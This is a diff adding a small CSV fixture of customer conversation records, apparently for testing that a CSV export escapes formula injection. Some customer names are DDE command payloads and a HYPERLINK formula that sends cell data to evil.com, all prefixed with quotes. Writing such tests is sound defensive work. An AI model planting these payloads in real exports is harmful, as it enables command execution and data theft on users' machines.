@@ -1,0 +1,6 @@
+id,customerName,channel,status,messageCount,createdAt,resolvedAt
+1,'=CMD|'/C calc'!A0,web_chat,active,5,2026-03-09T10:00:00Z,
+2,'@SUM(1+1)*cmd|/C calc!A0,email,resolved,12,2026-03-09T11:00:00Z,2026-03-09T12:00:00Z
+3,Normal Customer,web_chat,active,3,2026-03-09T12:00:00Z,
+4,'+malicious,slack,pending,7,2026-03-09T13:00:00Z,
+5,"'=HYPERLINK(""https://evil.com/""&A2,""Click"")",web_chat,resolved,9,2026-03-09T14:00:00Z,2026-03-09T15:00:00Z
